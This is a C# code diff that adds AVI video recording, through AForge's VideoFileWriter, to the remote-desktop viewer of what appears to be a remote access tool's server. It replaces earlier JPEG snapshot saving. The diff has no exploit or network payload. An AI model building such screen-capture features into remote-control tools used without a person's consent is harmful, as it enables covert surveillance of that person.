@@ -16,6 +16,7 @@ using System.Threading;
 using System.Drawing.Imaging;
 using System.IO;
 using AForge.Video;
+using AForge.Video.FFMPEG;
 using Encoder = System.Drawing.Imaging.Encoder;
 
 namespace Server.Forms {
@@ -38,7 +39,8 @@ namespace Server.Forms {
             _keysPressed = new List<Keys>();
             InitializeComponent();
         }
-
+        private VideoFileWriter videoFileWriter;
+        private readonly int targetFPS = 30;
 
         private void timer1_Tick(object sender, EventArgs e) {
             try {
@@ -92,8 +94,11 @@ namespace Server.Forms {
                 if (timerSave.Enabled) {
                     timerSave.Stop();
                     btnSave.BackgroundImage = Properties.Resources.save_image;
+                    videoFileWriter.Close();
                 }
                 else {
+                    videoFileWriter = new VideoFileWriter();
+                    videoFileWriter.Open(FullPath + $"\\Capture_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.avi", pictureBox1.Image.Width, pictureBox1.Image.Height, targetFPS, VideoCodec.MPEG4);
                     timerSave.Start();
                     btnSave.BackgroundImage = Properties.Resources.save_image2;
                     try {
@@ -107,23 +112,28 @@ namespace Server.Forms {
         }
 
         private void TimerSave_Tick(object sender, EventArgs e) {
-            /*try {
+            try {
                 if (!Directory.Exists(FullPath))
                     Directory.CreateDirectory(FullPath);
-                Encoder myEncoder = Encoder.Quality;
+                /*Encoder myEncoder = Encoder.Quality;
                 EncoderParameters myEncoderParameters = new EncoderParameters(1);
                 EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                 myEncoderParameters.Param[0] = myEncoderParameter;
-                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
-                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
-                myEncoderParameters?.Dispose();
-                myEncoderParameter?.Dispose();
-            }
-            catch { }*/
+                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);*/
 
+                // pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
+                Bitmap frame = new Bitmap(pictureBox1.Image.Width, pictureBox1.Image.Height);
+                using (Graphics g = Graphics.FromImage(frame)) { g.DrawImage(pictureBox1.Image, 0, 0); }
+                videoFileWriter.WriteVideoFrame(frame);
+
+                frame?.Dispose();
+                /*myEncoderParameters?.Dispose();
+                myEncoderParameter?.Dispose();*/
+            }
+            catch { }
         }
 
-        private ImageCodecInfo GetEncoder(ImageFormat format) {
+        /*private ImageCodecInfo GetEncoder(ImageFormat format) {
             ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
             foreach (ImageCodecInfo codec in codecs) {
                 if (codec.FormatID == format.Guid) {
@@ -131,7 +141,7 @@ namespace Server.Forms {
                 }
             }
             return null;
-        }
+        }*/
 
         private void PictureBox1_MouseDown(object sender, MouseEventArgs e) {
             try {
@@ -207,6 +217,7 @@ namespace Server.Forms {
         private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e) {
             try {
                 GetImage?.Dispose();
+                videoFileWriter.Close();
                 ThreadPool.QueueUserWorkItem((o) => {
                     Client?.Disconnected();
                 });
